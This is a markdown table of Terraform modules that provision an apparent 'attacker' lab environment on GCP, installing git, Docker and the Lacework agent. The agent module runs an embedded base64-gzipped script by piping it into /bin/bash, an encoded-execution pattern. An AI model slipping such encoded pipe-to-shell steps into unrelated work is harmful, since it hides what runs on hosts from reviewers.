| ModuleName                                              | Source                                                | Tag                                             | ConfigPath                                                       | ConfigOptionsDefault                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | PayloadPath                                                                                                      | Payload                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
|:--------------------------------------------------------|:------------------------------------------------------|:------------------------------------------------|:-----------------------------------------------------------------|:-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|:-----------------------------------------------------------------------------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| attacker-osconfig-deploy-git                            | ./modules/osconfig/deploy-git                         | osconfig_deploy_git                             | context.gcp.osconfig.deploy_git                                  | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_git": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-git                         | <pre>locals &&#35;123;<br/>    tool=&quot;git&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Checking for $&&#35;123;local&#46;tool&&#35;125;&#46;&#46;&#46;&quot;<br/>     if &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>        log &quot;$&&#35;123;local&#46;tool&&#35;125; not found installation required&quot;<br/>    fi<br/>    log &quot;$&&#35;123;local&#46;tool&&#35;125; path: $&&#35;40;command &#45;v  $&&#35;123;local&#46;tool&&#35;125;&&#35;41;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&&#35;95;packages = &quot;git&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&&#35;95;packages = &quot;git&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| attacker-osconfig-deploy-docker                         | ./modules/osconfig/deploy-docker                      | osconfig_deploy_docker                          | context.gcp.osconfig.deploy_docker                               | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_docker": {<br/>                    "docker_users": [],<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker                      | <pre>locals &&#35;123;<br/>    tool=&quot;docker&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Checking for $&&#35;123;local&#46;tool&&#35;125;&#46;&#46;&#46;&quot;<br/>    if &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>        log &quot;$&&#35;123;local&#46;tool&&#35;125; not found installation required&quot;<br/>    fi<br/>    log &quot;$&&#35;123;local&#46;tool&&#35;125; path: $&&#35;40;command &#45;v  $&&#35;123;local&#46;tool&&#35;125;&&#35;41;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            &#35; ensure non root users are added to the docker group<br/>            if &&#35;91;&&#35;91; &quot;&quot; &#33;= &quot;$&&#35;123;join&&#35;40;&quot; &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;&quot; &&#35;93;&&#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>                usermod &#45;aG docker $&&#35;123;join&&#35;40;&quot;&&#35;92;nusermod &#45;aG docker &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;<br/>            fi<br/>            exit 0; <br/>        fi<br/>        sudo apt&#45;get update<br/>        sudo apt&#45;get remove &#45;y docker docker&#45;engine docker&#46;io containerd runc<br/>        sudo apt&#45;get install &#45;y &&#35;92;<br/>            ca&#45;certificates &&#35;92;<br/>            curl &&#35;92;<br/>            gnupg &&#35;92;<br/>            lsb&#45;release<br/>        sudo mkdir &#45;p /etc/apt/keyrings<br/>        sudo rm &#45;f /etc/apt/keyrings/docker&#46;gpg<br/>        curl &#45;fsSL https://download&#46;docker&#46;com/linux/ubuntu/gpg &#124; sudo gpg &#45;&#45;dearmor &#45;o /etc/apt/keyrings/docker&#46;gpg<br/>        echo &&#35;92;<br/>        &quot;deb &&#35;91;arch=$&&#35;40;dpkg &#45;&#45;print&#45;architecture&&#35;41; signed&#45;by=/etc/apt/keyrings/docker&#46;gpg&&#35;93; https://download&#46;docker&#46;com/linux/ubuntu &&#35;92;<br/>        $&&#35;40;lsb&&#35;95;release &#45;cs&&#35;41; stable&quot; &#124; sudo tee /etc/apt/sources&#46;list&#46;d/docker&#46;list &gt; /dev/null<br/>        sudo apt&#45;get update<br/>        EOT<br/>        apt&&#35;95;packages = &quot;docker&#45;ce docker&#45;ce&#45;cli containerd&#46;io docker&#45;buildx&#45;plugin docker&#45;compose&#45;plugin&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        &#35; ensure non root users are added to the docker group<br/>        if &&#35;91;&&#35;91; &quot;&quot; &#33;= &quot;$&&#35;123;join&&#35;40;&quot; &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;&quot; &&#35;93;&&#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>            usermod &#45;aG docker $&&#35;123;join&&#35;40;&quot;&&#35;92;nusermod &#45;aG docker &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;<br/>        fi<br/>        EOT<br/>        yum&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;;<br/>            &#35; ensure non root users are added to the docker group<br/>            if &&#35;91;&&#35;91; &quot;&quot; &#33;= &quot;$&&#35;123;join&&#35;40;&quot; &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;&quot; &&#35;93;&&#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>                usermod &#45;aG docker $&&#35;123;join&&#35;40;&quot;&&#35;92;nusermod &#45;aG docker &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;<br/>            fi<br/>            exit 0; <br/>        fi<br/>        yum update &#45;y<br/>        yum remove docker &&#35;92;<br/>                  docker&#45;client &&#35;92;<br/>                  docker&#45;client&#45;latest &&#35;92;<br/>                  docker&#45;common &&#35;92;<br/>                  docker&#45;latest &&#35;92;<br/>                  docker&#45;latest&#45;logrotate &&#35;92;<br/>                  docker&#45;logrotate &&#35;92;<br/>                  docker&#45;engine<br/>        yum install &#45;y yum&#45;utils<br/>        yum&#45;config&#45;manager &#45;&#45;add&#45;repo https://download&#46;docker&#46;com/linux/centos/docker&#45;ce&#46;repo<br/>        EOT<br/>        yum&&#35;95;packages = &quot;docker&#45;ce docker&#45;ce&#45;cli containerd&#46;io docker&#45;buildx&#45;plugin docker&#45;compose&#45;plugin&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        &#35; ensure non root users are added to the docker group<br/>        if &&#35;91;&&#35;91; &quot;&quot; &#33;= &quot;$&&#35;123;join&&#35;40;&quot; &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;&quot; &&#35;93;&&#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>            usermod &#45;aG docker $&&#35;123;join&&#35;40;&quot;&&#35;92;nusermod &#45;aG docker &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;<br/>        fi<br/>        EOT<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| attacker-osconfig-deploy-lacework-agent                 | ./modules/osconfig/deploy-lacework-agent              | osconfig_deploy_lacework                        | context.gcp.osconfig.deploy_lacework_agent                       | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_lacework_agent": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-agent              | <pre>locals &&#35;123;<br/>    tool = &quot;lacework&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Starting&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93; &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>        log &quot;lacework already installed &#45; nothing to do&quot;<br/>    else<br/>        log &quot;lacework not installed &#45; installing&#46;&#46;&#46;&quot;<br/>        echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;setup&&#35;95;lacework&&#35;95;agent&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &#124; /bin/bash &#45;<br/>    fi<br/>    log &quot;done&#46;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93; &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        if &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93; &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    setup&&#35;95;lacework&&#35;95;agent = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/setup&&#35;95;lacework&&#35;95;agent&#46;sh&quot;, &&#35;123;<br/>        LaceworkInstallPath=&quot;/var/lib/lacework&quot;<br/>        LaceworkTempPath=var&#46;inputs&&#35;91;&quot;lacework&&#35;95;agent&&#35;95;temp&&#35;95;path&quot;&&#35;93;<br/>        Tags=jsonencode&&#35;40;var&#46;inputs&&#35;91;&quot;lacework&&#35;95;agent&&#35;95;tags&quot;&&#35;93;&&#35;41;<br/>        Hash=&quot;&quot;<br/>        Serverurl=var&#46;inputs&&#35;91;&quot;lacework&&#35;95;server&&#35;95;url&quot;&&#35;93;<br/>        Token=try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;lacework&&#35;95;agent&&#35;95;access&&#35;95;token&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;lacework&&#35;95;agent&&#35;95;access&&#35;95;token&quot;&&#35;93; : lacework&&#35;95;agent&&#35;95;access&&#35;95;token&#46;agent&&#35;91;0&&#35;93;&#46;token<br/>    &&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;setup&&#35;95;lacework&&#35;95;agent&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;setup&&#35;95;lacework&&#35;95;agent&&#35;41;<br/>            &&#35;125;<br/>        &&#35;93;<br/>    &&#35;125;<br/>&&#35;125;<br/><br/>&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;<br/>&#35; LACEWORK AGENT<br/>&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;<br/><br/>resource &quot;random&&#35;95;string&quot; &quot;this&quot; &&#35;123;<br/>    length            = 4<br/>    special           = false<br/>    upper             = false<br/>    lower             = true<br/>    numeric           = true<br/>&&#35;125;<br/><br/>resource &quot;lacework&&#35;95;agent&&#35;95;access&&#35;95;token&quot; &quot;agent&quot; &&#35;123;<br/>    count = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;lacework&&#35;95;agent&&#35;95;access&&#35;95;token&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? 0 : 1<br/>    name = &quot;endpoint&#45;agent&#45;access&#45;token&#45;$&&#35;123;random&&#35;95;string&#46;this&#46;id&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
